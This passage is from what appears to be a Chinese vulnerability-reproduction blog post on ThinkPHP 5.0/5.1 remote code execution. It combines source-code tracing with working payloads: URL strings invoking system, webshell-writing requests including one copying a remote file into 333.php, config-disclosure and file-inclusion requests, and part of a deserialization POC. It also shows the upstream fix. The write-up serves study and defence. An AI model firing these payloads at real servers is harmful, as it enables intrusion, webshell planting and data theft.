<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>重点是在<code>foreach</code>中，可以覆盖类属性，那么我们可以通过覆盖<code>Request</code>类的属性把 filter 的值赋为<code>system</code></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240310113237649.png" alt="image-20240310113237649"></p>
<p>但是在哪会调用filter呢？我们要追踪下thinkphp的运行流程，上面说过，因为thinkphp是单程序入口，入口在public&#x2F;index.php，在index.php中</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">require</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/../thinkphp/start.php'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>会引入框架的<code>start.php</code>，跟进之后调用了App类的静态<code>run()</code>方法</p>
<p>看一下run方法的定义</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Request</span> <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token operator">...</span>省略<span class="token operator">...</span>
        <span class="token comment">// 获取应用调度信息</span>
        <span class="token variable">$dispatch</span> <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$dispatch</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$dispatch</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 进行URL路由检测</span>
        <span class="token variable">$dispatch</span> <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token function">routeCheck</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 记录当前调度信息</span>
    <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token variable">$dispatch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 记录路由和请求信息</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name static-context">Log</span><span class="token operator">::</span><span class="token function">record</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[ ROUTE ] '</span> <span class="token operator">.</span> <span class="token function">var_export</span><span class="token punctuation">(</span><span class="token variable">$dispatch</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name static-context">Log</span><span class="token operator">::</span><span class="token function">record</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[ HEADER ] '</span> <span class="token operator">.</span> <span class="token function">var_export</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token function">header</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name static-context">Log</span><span class="token operator">::</span><span class="token function">record</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[ PARAM ] '</span> <span class="token operator">.</span> <span class="token function">var_export</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">/*...省略部分...*/</span>
        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$dispatch</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">case</span> <span class="token string single-quoted-string">'redirect'</span><span class="token punctuation">:</span>
                <span class="token comment">// 执行重定向跳转</span>
                <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token class-name static-context">Response</span><span class="token operator">::</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token variable">$dispatch</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'redirect'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">code</span><span class="token punctuation">(</span><span class="token variable">$dispatch</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'status'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token string single-quoted-string">'module'</span><span class="token punctuation">:</span>
                <span class="token comment">// 模块/控制器/操作</span>
                <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token function">module</span><span class="token punctuation">(</span><span class="token variable">$dispatch</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'module'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">,</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$dispatch</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'convert'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$dispatch</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'convert'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token string single-quoted-string">'controller'</span><span class="token punctuation">:</span>
                <span class="token comment">// 执行控制器操作</span>
                <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token class-name static-context">Request</span><span class="token operator">::</span><span class="token function">instance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$dispatch</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token class-name static-context">Loader</span><span class="token operator">::</span><span class="token function">action</span><span class="token punctuation">(</span><span class="token variable">$dispatch</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'controller'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url_controller_layer'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'controller_suffix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token string single-quoted-string">'method'</span><span class="token punctuation">:</span>
                <span class="token comment">// 执行回调方法</span>
                <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token class-name static-context">Request</span><span class="token operator">::</span><span class="token function">instance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$dispatch</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token function">invokeMethod</span><span class="token punctuation">(</span><span class="token variable">$dispatch</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'method'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token string single-quoted-string">'function'</span><span class="token punctuation">:</span>
                <span class="token comment">// 执行闭包</span>
                <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token function">invokeFunction</span><span class="token punctuation">(</span><span class="token variable">$dispatch</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token string single-quoted-string">'response'</span><span class="token punctuation">:</span>
                <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$dispatch</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'response'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">default</span><span class="token punctuation">:</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>InvalidArgumentException</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'dispatch type not support'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先是经过<code>$dispatch = self::routeCheck($request, $config)</code>检查调用的路由</p>
<p>然后会根据debug开关来选择是否执行<code>Request::instance()-&gt;param()</code></p>
<p>接下来是switch分支语句，当<code>$dispatch</code>等于<code>controller</code>或者<code>method</code>时会执行<code>Request::instance()-&gt;param()</code>，即只要是存在的路由就可以进入这两个case分支</p>
<p>而在 ThinkPHP5 完整版中，定义了验证码类的路由地址<code>?s=captcha</code>，默认这个方法就能使<code>$dispatch=method</code>从而进入<code>Request::instance()-&gt;param()</code></p>
<p>继续跟进<code>Request::instance()-&gt;param()</code></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240310120524544.png" alt="image-20240310120524544"></p>
<p>判断请求类型后会 return 一个<code>input()</code>方法，跟进</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240915171647553.png" alt="image-20240915171647553"></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240915165013835.png" alt="image-20240915165013835"></p>
<p>将被<code>__contruct</code>覆盖掉的filter字段回调进<code>filterValue()</code>，这个方法我们需要特别关注了，因为 <code>Request</code> 类中的 param、route、get、post、put、delete、patch、request、session、server、env、cookie、input 方法均调用了 <code>filterValue</code> 方法，而该方法中就存在可利用的 <code>call_user_func</code> 函数</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240310120827855.png" alt="image-20240310120827855"></p>
<p>那么，只要我们在POST请求处污染 filter 为 system ，就可以rce</p>
<p>流程图——by 七月火</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240310120911625.png" alt="image-20240310120911625"></p>
<h3 id="debug相关"><a href="#debug相关" class="headerlink" title="debug相关"></a>debug相关</h3><p>5.0.13版本之后需要开启debug才能rce</p>
<p>如果不开debug直接rce则需要利用到验证码的路由</p>
<p><code>&quot;topthink/think-captcha&quot;: &quot;^1.0&quot;</code></p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">?</span>s<span class="token operator">=</span>captcha<span class="token operator">/</span>calc
_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>method<span class="token operator">=</span><span class="token constant">GET</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<hr>
<h2 id="未开启强制路由导致rce"><a href="#未开启强制路由导致rce" class="headerlink" title="未开启强制路由导致rce"></a>未开启强制路由导致rce</h2><p>5.0.0 &lt;&#x3D; ThinkPHP5 &lt;&#x3D; 5.0.23 、5.1.0 &lt;&#x3D; ThinkPHP &lt;&#x3D; 5.1.30</p>
<h3 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">composer</span> create-project topthink/think<span class="token operator">=</span><span class="token number">5.1</span>.29 tp51x --prefer-dist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>composer.json</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"require"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"php"</span><span class="token operator">:</span> <span class="token string">">=5.6.0"</span><span class="token punctuation">,</span>
    <span class="token property">"topthink/framework"</span><span class="token operator">:</span> <span class="token string">"5.1.29"</span><span class="token punctuation">,</span>
    <span class="token property">"topthink/think-captcha"</span><span class="token operator">:</span> <span class="token string">"2.*"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后<code>composer update</code></p>
<h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><p>命令执行</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">5.0</span><span class="token operator">.</span>x
<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>id
<span class="token number">5.1</span><span class="token operator">.</span>x
<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Request<span class="token operator">/</span>input<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>data<span class="token operator">=</span>pwd
<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Container<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>id
<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>写shell</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">5.0.x
?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=copy(%27远程地址%27,%27333.php%27)
5.1.x
?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
?s=index/\think\view\driver\Think/display&amp;template=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>             //shell生成在runtime/temp/md5(template).php
?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=copy(%27远程地址%27,%27333.php%27)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其他</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">5.0</span><span class="token operator">.</span>x
<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>think\config<span class="token operator">/</span>get<span class="token operator">&amp;</span>name<span class="token operator">=</span>database<span class="token operator">.</span>username <span class="token comment">// 获取配置信息</span>
<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Lang<span class="token operator">/</span>load<span class="token operator">&amp;</span>file<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>test<span class="token operator">.</span>jpg    <span class="token comment">// 包含任意文件</span>
<span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Config<span class="token operator">/</span>load<span class="token operator">&amp;</span>file<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>t<span class="token operator">.</span>php     <span class="token comment">// 包含任意.php文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果碰到了控制器不存在的情况，是因为在tp获取控制器时，<code>thinkphp/library/think/App.php:561</code>会把url转为小写，导致控制器加载失败</p>
<h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>以<code>?s=index/\think\Request/input&amp;filter[]=system&amp;data=whoami</code>为例，同版本的那几个payload原理都是一样的</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240310173316596.png" alt="image-20240310173316596"></p>
<p>thinkphp默认没有开启强制路由，而且默认开启路由兼容模式</p>
<p>那么我们可以用兼容模式来调用控制器，当没有对控制器过滤时，我们可以调用任意的方法来执行</p>
<p>前面说过所有用户参数都会经过 <code>Request</code> 类的 <code>input</code> 方法处理，该方法会调用 <code>filterValue</code> 方法，而 <code>filterValue</code> 方法中使用了 <code>call_user_func</code> ，那么我们就来尝试利用这个方法</p>
<p>接下来访问</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Request<span class="token operator">/</span>input<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>data<span class="token operator">=</span>whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>打断点跟进到<code>thinkphp/library/think/App.php:402</code></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240310174537301.png" alt="image-20240310174537301"></p>
<p>跟进 routeCheck 到 return 处，发现返回的<code>$dispatch</code>是将<code>$path</code>中的<code>/</code> 用 <code>|</code> 替换</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240310174504048.png" alt="image-20240310174504048"></p>
<p>然后进入<code>init()</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token comment">// 解析默认的URL规则</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">parseUrl</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dispatch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Module</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">request</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">rule</span><span class="token punctuation">,</span> <span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>进入<code>parseUrl()</code></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240310175016655.png" alt="image-20240310175016655"></p>
<p>进入<code>parseUrlPath()</code></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240310175134129.png" alt="image-20240310175134129"></p>
<p>在此处从url中获取<code>[模块/控制器/操作]</code>，导致最终parseUrl()返回的route为</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240310175312258.png" alt="image-20240310175312258"></p>
<p>导致 thinkphp&#x2F;library&#x2F;think&#x2F;App.php:406 的<code>$dispatch</code>为</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240310175423557.png" alt="image-20240310175423557"></p>
<p>然后继续跟踪到第435行的<code>$response = $this-&gt;middleware-&gt;dispatch($this-&gt;request);</code></p>
<p>跟进到 thinkphp&#x2F;library&#x2F;think&#x2F;Middleware.php:185，接下来会再次调用<code>resolve</code></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240310221940392.png" alt="image-20240310221940392"></p>
<p>继续跟进到 thinkphp&#x2F;library&#x2F;think&#x2F;route&#x2F;dispatch&#x2F;Module.php:135</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311003431246.png" alt="image-20240311003431246"></p>
<p>此时进入了反射方法，其中参数均可控</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311003947849.png" alt="image-20240311003947849"></p>
<p>接下来会调用<code>input()</code>函数，跟进到 thinkphp&#x2F;library&#x2F;think&#x2F;Request.php:1358</p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311004205395.png" alt="image-20240311004205395"></p>
<p>进入<code>filterValue</code>，前面分析源码的时候我们就知道这个方法里面会调用<code>call_user_func</code></p>
<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240311004333804.png" alt="image-20240311004333804"></p>
<p>于是最终的命令执行点是在 thinkphp&#x2F;library&#x2F;think&#x2F;Request.php:1437</p>
<p>整个流程中没有对控制器进行合法校验，导致可以调用任意控制器，实现rce</p>
<h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 获取控制器名</span>
<span class="token variable">$controller</span> <span class="token operator">=</span> <span class="token function">strip_tags</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'default_controller'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[A-Za-z](\w|\.)*$/'</span><span class="token punctuation">,</span> <span class="token variable">$controller</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">HttpException</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'controller not exists:'</span> <span class="token operator">.</span> <span class="token variable">$controller</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大于5.0.23、大于5.1.30获取时使用正则匹配校验</p>
<hr>
<h2 id="5-0-x反序列化链"><a href="#5-0-x反序列化链" class="headerlink" title="5.0.x反序列化链"></a>5.0.x反序列化链</h2><p>这个暂时不复现了（</p>
<p>在5.0.24和5.0.18可用，5.0.9不可用</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">//__destruct</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$pivot</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$pivot</span><span class="token punctuation">;</span> <span class="token comment">//传入Pivot类</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//__toString Model子类</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">protected</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">,</span><span class="token variable">$hasone</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span><span class="token operator">=</span><span class="token variable">$output</span><span class="token punctuation">;</span> <span class="token comment">//$this->parent等于Output类</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token operator">=></span><span class="token string single-quoted-string">'getError'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">error</span><span class="token operator">=</span><span class="token variable">$hasone</span><span class="token punctuation">;</span>   <span class="token comment">//$modelRelation=$this->error</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//getModel</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>
